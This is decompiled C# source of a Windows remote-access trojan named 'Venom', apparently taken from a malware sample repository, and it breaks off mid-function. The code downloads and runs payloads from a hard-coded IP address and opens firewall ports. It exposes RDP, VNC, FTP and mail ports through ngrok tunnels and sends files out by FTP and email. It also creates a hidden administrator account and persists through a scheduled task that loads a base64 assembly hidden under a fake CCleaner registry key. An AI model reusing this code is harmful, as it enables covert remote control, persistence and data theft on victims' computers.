// Decompiled with JetBrains decompiler
// Type: 㥗☢귝銕꿍輁쮒ၪሦꮑ⨄琄ങ໙⹨覜㓼똡眄餶
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Management;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class 㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶
{
  private const string \u2E3Aஒ维妿텪軔缤훸\u221E\uE4C7ꂎ옐Ϩ禴\uE1B5ց쀏\u21DF膃\u0FEC = "Venom";
  private const string 籗ﺯ礧\u2E5A宅\uE3D2ꀭ忨ꤩ贄\uE934놝\u089F밹\uE433\u1FF5㣾\uF729枒\uECD4 = "Administrators Group";
  private const string 석塉懲騾뇫\u2BB5\uFFFDתみᙓ複윕쇰繊矛蔊\uF8BA\u2657䜮焫 = "Venom";

  public static void ꅞ厉繀컛螈숲\u27EC芓\uEE41\uFFFD\uEEF1耻\uEDE4있ﵳ賟页с㤆급(
    string fTPAddress,
    string username,
    string password,
    string filename)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "ftp.txt"));
      streamWriter.WriteLine("open ftp://" + username + ":" + password + "@" + fTPAddress + "/");
      streamWriter.WriteLine("put " + filename);
      streamWriter.WriteLine("quit");
      streamWriter.Close();
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception: " + ex.Message);
    }
    finally
    {
      Console.WriteLine("Executing finally block.");
    }
  }

  public static void 諙\u2AD6븏\uF480矂\u25F2蘫\uEBEC\uEF5F룻㫵ﱸꂃጡ엯쐱搜\u2080\uEAC4珓(
    string fTPAddress,
    string username,
    string password,
    string zipName)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(fTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
    int num = (int) MessageBox.Show("Uploaded Successfully");
  }

  public static void \uFF0F䵓䏠횆괹ǡ鮣\uF765弒댜啾䡸簡\u2A81\uE130鞩哾츨㛵昧(string txt, string token)
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.\uF605\u2724吵踞덣霟ฑޙ伱\uFFFD\uEA82瞝뭕\u2EE6ꅃ\uF2D6휮徹스ꏊ();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.鞩댉侯芆ꓘ齰ꎃୱ䐚饈꺈\uF640ꇙ䶌勇쓥퇪\uFB0C䇱腣(token);
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.exe", Path.Combine(Path.GetTempPath(), "WinSCP.exe"));
    string fileName = Path.Combine(Path.GetTempPath(), "WinSCP.com");
    new WebClient().DownloadFile("http://91.134.207.16/WinSCP.com", fileName);
    Thread.Sleep(20000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "upload.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine(fileName + "  /script=ftp.txt");
    streamWriter.Close();
    Thread.Sleep(20000);
    string str2 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    string str3 = Path.Combine(Path.GetTempPath(), "upload.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str3,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(40000);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ㄉ\u23D0㓄抋\uFF01戹\uF8E3잱ૐ㛵㚘携\uE885糇㹣怹懧\u0E7B훙鐦();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
  }

  public static void 㞫狘\uECEDꊪ\u2517\u319D䛳쉒踏숸㞳싫䨴堂絨祓迥ۮ⁯꦳(
    string filepath,
    string email,
    string toemail,
    string password)
  {
    Process.Start(Path.Combine(Path.GetTempPath(), "blatinst.exe"));
    Thread.Sleep(5000);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "blat.bat"));
      string str1 = Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine(str1 + " -install smtp.gmail.com -u " + email + " -pw " + password);
      streamWriter.WriteLine(str1 + " -s Velos Report -to " + toemail + " -f " + email + " -body Files -attach " + filepath);
      streamWriter.Close();
      Thread.Sleep(5000);
      string str2 = Path.Combine(Path.GetTempPath(), "blat.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str2,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.棦ȡ훬뙎爸ط낉띡\u19FA脎⳱같찠㤘쏷稾\u2653\uE121厤쁔();
    }
    catch (Exception ex)
    {
    }
  }

  public static void \uF605\u2724吵踞덣霟ฑޙ伱\uFFFD\uEA82瞝뭕\u2EE6ꅃ\uF2D6휮徹스ꏊ()
  {
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=in action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP1 dir=out action=allow protocol=TCP localport=21 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=in action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTP2 dir=out action=allow protocol=TCP localport=25 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=Submission dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=in action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SMTPS dir=out action=allow protocol=TCP localport=465 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=in action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=IMAP dir=out action=allow protocol=TCP localport=993 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=in action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3S dir=out action=allow protocol=TCP localport=995 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=in action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=POP3 dir=out action=allow protocol=TCP localport=110 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=in action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=ESMTP dir=out action=allow protocol=TCP localport=587 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_IN dir=in action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b netsh advfirewall firewall add rule name=SSH_OUT dir=out action=allow protocol=TCP localport=22 & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void ꗅ\uEF6C瘉ꢒ탸㓤襃\u256F\uE3CD棚豤欺蕫僳辶憍䲵腶䟡蚵(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixemail.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  587 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixemail.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 鞩댉侯芆ꓘ齰ꎃୱ䐚饈꺈\uF640ꇙ䶌勇쓥퇪\uFB0C䇱腣(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "fixftp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  21 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "fixftp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void ㄉ\u23D0㓄抋\uFF01戹\uF8E3잱ૐ㛵㚘携\uE885糇㹣怹懧\u0E7B훙鐦()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("ngrok"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void \uA703\uF6BAや\u1808ꀝ\uFFFD权蘻懫헶畝ꅬ㓉쒟\uF70E\u12B1嫉뷁ퟻ\uF21D()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.Message);
    }
  }

  public static void \u4DFD昜\uA878骈섅\uEDD5ἅ\uFFFD\u2BF7顽ꟼ聆橵ݮ\uE44Aꩃ뿊\uFFFD\uEAFC謝(string code)
  {
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Ccleaner", true);
    if (registryKey == null)
      Registry.CurrentUser.CreateSubKey("Software\\Ccleaner").SetValue("Ccleaner", (object) code);
    else if (registryKey.GetValue("Ccleaner") == null || !registryKey.GetValue("Ccleaner").ToString().Equals(code, StringComparison.CurrentCultureIgnoreCase))
    {
      registryKey.SetValue("Ccleaner", (object) code);
    }
    else
    {
      string str = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\Ccleaner\\).Ccleaner)).EntryPoint.Invoke($Null,$Null)";
      Process.Start(new ProcessStartInfo()
      {
        FileName = "schtasks",
        Arguments = "/create /sc minute /mo 1 /tn Ccleaner /tr \"" + str + "\"",
        CreateNoWindow = true,
        ErrorDialog = false,
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }
  }

  public static void ᆆ願肻\u26B2폳竘\uFFFD飞谤巀疍羭\uFFFD\uE333ⲋ紹痑\uF48F㭂\u2BB3()
  {
    try
    {
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.蚭ͮ僃㢁ⶼ䥸\u000B\uE303녕\uE9ABﳙ\u33E3홪庑뇐\uEEA5흦澵쐾얤();
      string str = "Venom";
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ᾮ湒檱乯뚸멳\u058E緀띔琶恝萸\u1B4F\u32AC评皢卽宎灁枇(str);
      墖鲅썺蝜奷諐뀰韠\uF0A9句뿶\uEC64씿胗\uE1E6䞛\uE449鮝\uE057嫶.抿鷯ᠽꞗ槟Ճ璪\uE6AA풅ퟒ剒戌\uFFFD䊇\uE09A枱ꪢ쏚\uA7BEट(str);
      Thread.Sleep(20000);
      string fileName1 = Path.Combine(Path.GetTempPath(), "installrdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/rdpinstall.exe", fileName1);
      Process.Start(fileName1);
      Thread.Sleep(20000);
      string fileName2 = Path.Combine(Path.GetTempPath(), "autoupdate1.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate1.exe", fileName2);
      Process.Start(fileName2);
      Thread.Sleep(20000);
      string fileName3 = Path.Combine(Path.GetTempPath(), "autoupdate2.exe");
      new WebClient().DownloadFile("http://91.134.207.16/autoupdate2.exe", fileName3);
      Process.Start(fileName3);
      Thread.Sleep(20000);
      string fileName4 = Path.Combine(Path.GetTempPath(), "updaterdp.exe");
      new WebClient().DownloadFile("http://91.134.207.16/update.exe", fileName4);
      Process.Start(fileName4);
      Thread.Sleep(10000);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    }
    catch
    {
    }
  }

  public static void 軗ׁ媐龓䨆\uFFFD\uEC55噰\u2F30왐\uF6C0㱤폊杰\u31CB\u2493뒍\uEEB0롇偃()
  {
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.齼랺\uE9E9ⶫ刋쿿\uE44B誘\u33BA\u0EBE\u215B鎼\u2805瘎ඪ\uA6FCꓪ茭䟞䁔();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
    Thread.Sleep(15000);
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "dvnc.bat"));
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("set exeFile=%TEMP%\\Install.exe");
    streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
    streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/Install.exe','%exeFile%');");
    streamWriter.Close();
    string str1 = Path.Combine(Path.GetTempPath(), "dvnc.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str1,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string str2 = Path.Combine(Path.GetTempPath(), "Install.exe");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Thread.Sleep(30000);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ࠊ跐碀\u26BC䍢뜢릖ﭒꄖ\u2157ᶮꢏ\u2E46翝킩ᙊ\u20C6菸懡雲();
  }

  public static void 鞣\uE814鼓し䱒妞\uFFFD圸ힻ\uE379ጓ랎ξᱚ\uF78A繰匂嶶垯尤(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "rdp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  3389 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "rdp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(30000);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.䶠븠ᚸ\u2FC8ꉑ၇닽ꏣ\uEFE8鼔깠犷\u3387ﺏ憿뽫䦘Ϲ㼘൩();
    }
    catch (Exception ex)
    {
    }
  }

  public static void ꟻ\u1C9F\u2E2Aด㺕\uE6D8겅皒龕ࡍ\u0CF3舭쉊뼓ᶔ鶟\u20B2ơ聄\uE2CF(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "vnc.bat"));
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token);
      streamWriter.WriteLine("%exeFile%  tcp  5900 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "vnc.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      Thread.Sleep(10000);
      㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.䶠븠ᚸ\u2FC8ꉑ၇닽ꏣ\uEFE8鼔깠犷\u3387ﺏ憿뽫䦘Ϲ㼘൩();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 䶠븠ᚸ\u2FC8ꉑ၇닽ꏣ\uEFE8鼔깠犷\u3387ﺏ憿뽫䦘Ϲ㼘൩()
  {
    string fileName = Path.Combine(Path.GetTempPath(), "getrdp.exe");
    new WebClient().DownloadFile("http://91.134.207.16/getrdp.exe", fileName);
    Process.Start(fileName).WaitForExit();
    Thread.Sleep(20000);
    string str1 = Path.Combine(Path.GetTempPath());
    StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "geturl.bat"));
    streamWriter.WriteLine("cd " + str1);
    streamWriter.WriteLine("curl.exe --silent http://127.0.0.1:4040/api/tunnels | jq.exe .tunnels[0].public_url | FindStr tcp: >> url1.txt");
    streamWriter.Close();
    Thread.Sleep(5000);
    string str2 = Path.Combine(Path.GetTempPath(), "geturl.bat");
    Process.Start(new ProcessStartInfo()
    {
      FileName = str2,
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    string path = Path.Combine(Path.GetTempPath(), "url1.txt");
    System.IO.File.WriteAllText(Path.Combine(Path.GetTempPath(), "url.txt"), System.IO.File.ReadAllText(path).Replace('"', ' '));
    Thread.Sleep(40000);
  }

  public static void \uE818㣍얿脅䩑徃\uFFFD㱎찚䣟썢\uE4C4톙䅥僥蜧壟芅\uF553რ(string username)
  {
    try
    {
      DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
      DirectoryEntry entry = directoryEntry.Children.Find(username, "user");
      directoryEntry.Children.Remove(entry);
      entry.Close();
      directoryEntry.Close();
    }
    catch (Exception ex)
    {
      throw ex;
    }
  }

  public static bool ꠡ\uF131\uEC9C螳\uF776篡\uEA59Ꭹ氐撨䤛饩ኣ讥ﳎ䏐ᯐ嵀ス꿕(string name)
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end != "" && end.ToLower().Contains("command completed successfully.");
  }

  public static bool \uFFFD\uE228쒪퍛\u2F8E\uE58F\u2572\u3290㿋逕锞ꀇ䓀趼䖶䶋섾ᵈ꫶\uF528(string name)
  {
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (!(end1 != "") || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != "" && end2.ToLower().Contains("command completed successfully.");
  }

  public static string \u2885㪆钆슻鈋ꐐ\uF571\uE2B9\u0384늧蘋羕\u2818ು瞂ủ깆乊ꗢꡥ()
  {
    string str = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    for (int index1 = 1; index1 <= 10; ++index1)
    {
      int index2 = random.Next(0, str.Length);
      char ch = str[index2];
      stringBuilder.Append(ch);
    }
    return stringBuilder.ToString();
  }

  public static void ᾮ湒檱乯뚸멳\u058E緀띔琶恝萸\u1B4F\u32AC评皢卽宎灁枇(string user)
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
